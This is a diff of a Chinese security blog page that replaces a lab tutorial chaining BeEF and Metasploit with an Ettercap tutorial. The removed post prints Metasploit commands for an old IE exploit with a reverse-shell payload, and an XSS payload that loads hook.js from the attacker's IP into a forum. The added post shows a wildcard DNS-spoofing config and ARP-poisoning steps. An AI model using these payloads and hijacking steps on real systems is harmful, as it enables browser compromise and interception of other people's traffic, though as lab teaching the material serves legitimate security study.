@@ -206,7 +206,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/06/BEEF-MSF/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/08/ettercap/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/Image.JPG">
@@ -220,7 +220,7 @@
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
           
-            <a href="/2020/01/06/BEEF-MSF/" class="post-title-link" itemprop="url">BEEF+MSF</a>
+            <a href="/2020/01/08/ettercap/" class="post-title-link" itemprop="url">ettercap</a>
         </h1>
 
         <div class="post-meta">
@@ -230,14 +230,14 @@
               </span>
               <span class="post-meta-item-text">Posted on</span>
 
-              <time title="Created: 2020-01-06 18:59:02" itemprop="dateCreated datePublished" datetime="2020-01-06T18:59:02+08:00">2020-01-06</time>
+              <time title="Created: 2020-01-08 11:38:20" itemprop="dateCreated datePublished" datetime="2020-01-08T11:38:20+08:00">2020-01-08</time>
             </span>
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-04-19 21:48:31" itemprop="dateModified" datetime="2020-04-19T21:48:31+08:00">2020-04-19</time>
+                <time title="Modified: 2020-04-19 21:48:19" itemprop="dateModified" datetime="2020-04-19T21:48:19+08:00">2020-04-19</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -262,25 +262,19 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><p>通过IE的漏洞提升我们的权限</p>
-<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>攻击机：Kali(192.168.209.138)<br>靶机：32位XP(192.168.209.129)<br>我们使用BEEF+MSF</p>
-<h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><p>我们就可以联想到使用MSF的ms14_064_ole_code_execution脚本，他可以利用IE浏览器的漏洞，这里我们配置一下属性，他会生成一个URL给我们，具体配置如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;windows&#x2F;browser&#x2F;ms14_064_ole_code_execution &#x2F;&#x2F;使用064的脚本</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;browser&#x2F;ms14_064_ole_code_execution) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp  &#x2F;&#x2F;使用交互的shell</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;browser&#x2F;ms14_064_ole_code_execution) &gt; set srvhost 192.168.209.137 &#x2F;&#x2F;设置主机</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;browser&#x2F;ms14_064_ole_code_execution) &gt; set uripath &#x2F;</span><br><span class="line">上面这一句是设置我们的路径，这样设置就可以了</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;browser&#x2F;ms14_064_ole_code_execution) &gt; set lhost 192.168.209.138  &#x2F;&#x2F;设置监听主机</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;browser&#x2F;ms14_064_ole_code_execution) &gt; set AllowPowershellPrompt true</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;browser&#x2F;ms14_064_ole_code_execution) &gt; exploit &#x2F;&#x2F;开始执行</span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.209.138:4444 </span><br><span class="line">msf5 exploit(windows&#x2F;browser&#x2F;ms14_064_ole_code_execution) &gt; [*] Using URL: http:&#x2F;&#x2F;192.168.209.138:8080&#x2F;</span><br><span class="line">[*] Server started.</span><br></pre></td></tr></table></figure>
-
-<p>可以看到我们的监听端口未8080，也就是我们默认的端口号。</p>
-<p>既然我们的监听端开启了，我们就来利用BEEF欺骗吧，首先打开我们的BEEF，这里说一下我的Kali没有自带，大家一样的话呢需要安装的。</p>
-<p>打开BEEF之后会出现下面的页面：<br><img src="img1.jpg" alt="BEEF页面"></p>
-<p>我们扫描一下目标网站的端口，发现开了80，打开网站，发现这么一个网址：</p>
-<p><img src="img2.jpg" alt="网站页面"></p>
-<p>发现是一个小论坛，我们猜测有XSS，这个时候我们提交我们的恶意JS代码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;tExtArEa&gt;&#39;&quot;&gt;&lt;sCRiPt sRC&#x3D;http:&#x2F;&#x2F;192.168.209.138:3000&#x2F;hook.js&gt;&lt;&#x2F;sCrIpT&gt;</span><br></pre></td></tr></table></figure>
-
-<p>这是一个比较广泛的用法，我们提交上去，当管理员，打开这个链接的时候，管理员会看到如下的页面：<br><img src="img3.jpg" alt="管理员视野"></p>
-<p>我们的BEEF上线了：<br><img src="img4.jpg" alt="BEEF上线页面"></p>
-<p>忽略我之前测试的哪一个。<br>这个时候我们上线我们的MSF，<a href="http://192.168.209.138:8080" target="_blank" rel="noopener">http://192.168.209.138:8080</a><br>这个URL，使我们的MSF利用URL，我们使用BEEF的：Redirect Browser插件，将我们的页面强行重定向为我们的MSF页面，这个时候我们的Session就上线了：<br><img src="img5.jpg" alt="BEEF重定向"></p>
-<p><img src="img6.jpg" alt="上线效果图"><br>这个时候我们使用</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions -i</span><br></pre></td></tr></table></figure>
-<p>查看我们的session，如果和效果图一样，那说明我们拿到权限了，然后使用sessions 1来执行我们的shell，这个1是根据上线的ID号，从1开始排序的。<br>然后简单执行以下dir：<br><img src="img7.jpg" alt="MSF执行"><br><img src="img8.jpg" alt="MSF执行"><br>这个时候发现已经可以了，这个时候其实我们就已经达到了拿取Shell的目的。<br>我们还是可以配合ettercap进行劫持提权，这个留给大家自己去思考，不知道的可以参考我的关于ettercap的文章。<br>其实写这篇文章的过程有很多坎坷，中途XP无数次蓝屏，原因我的Windbg给搞的，希望大家多多关注。</p>
+          <h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><p>劫持内网数据包，强行更改DNS</p>
+<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>攻击机：Kali(192.168.209.137)<br>靶机：32位XP(192.168.209.129)<br>我们使用ETTERCAP</p>
+<p>ETTERCAP一款著名的嗅探劫持工具，比较好用的插件就要数DNS劫持和ARP欺骗了。<br>使用<strong><em>vim /etc/ettercap/etter.dns</em></strong>编辑我们的配置文件,在这之前，我们需要先规范我们的思路，在这里既然可以劫持DNS，</p>
+<p>这个时候我们的ettercap就该上场了，我们首先设置我们的DNS劫持页面。<br><strong><em>vim /etc/ettercap/etter.dns</em></strong> 使用VIM进行编辑，也可以用自带的文本进行编辑。<br>将下面的这段文本找到并改为这个样子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">microsoft.com      A   107.170.40.56</span><br><span class="line">*.microsoft.com    A   107.170.40.56</span><br><span class="line">www.microsoft.com  PTR 107.170.40.56      # Wildcards in PTR are not allowed</span><br><span class="line">*				 A	 192.168.209.137   #这两条使我们添加的</span><br><span class="line">*				 PTR  192.168.209.137  #这两条使我们添加的</span><br></pre></td></tr></table></figure>
+<p>我们打开劫持工具，首先设置我们的网卡：<br><img src="img1.jpg" alt="网卡设置"></p>
+<p>设置好我们的网卡之后，我们扫描内网的机子，然后设置劫持，这里点击这两项：<br><img src="img2.jpg" alt="网卡设置"><br>我们会得到如下的几个IP：<br><img src="img3.jpg" alt="网卡设置"></p>
+<p>首先.1的使我Win10的机子，.2是我的网关，.129是目标的机子，这个时候我们将.2的机子Add to Target1，.129的机子Add to Target2.<br>之后我们设置我们的ARP，根据我这个样子进行设置：</p>
+<p><img src="img4.jpg" alt="网卡设置"></p>
+<p>设置我之后我们选择插件进行执行了，选择</p>
+<p><img src="img5.jpg" alt="网卡设置"></p>
+<p>我们点击Start sniffing<br>然后我们在靶机上访问百度，会看到我们的结果：<br><img src="img6.jpg" alt="网卡设置"><br>并且我们的ettercap会收到如下的信息：<br><img src="img7.jpg" alt="网卡设置"></p>
+<p>到此为止，我们的劫持就成功了，这是一种比较简单的方式，下章劫持我会介绍一下如何ARP欺骗的断网攻击，这样帮助我们在渗透测试网站的时候可以拿到C段就可以C段劫持。</p>
 
       
     </div>
@@ -300,7 +294,7 @@
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/122/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/122/">122</a><span class="page-number current">123</span><a class="page-number" href="/page/124/">124</a><a class="page-number" href="/page/125/">125</a><a class="extend next" rel="next" href="/page/124/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
+    <a class="extend prev" rel="prev" href="/page/122/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/122/">122</a><span class="page-number current">123</span><a class="page-number" href="/page/124/">124</a><span class="space">&hellip;</span><a class="page-number" href="/page/126/">126</a><a class="extend next" rel="next" href="/page/124/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
   </nav>
 
 
@@ -367,7 +361,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
           <a href="/archives">
-          <span class="site-state-item-count">125</span>
+          <span class="site-state-item-count">126</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
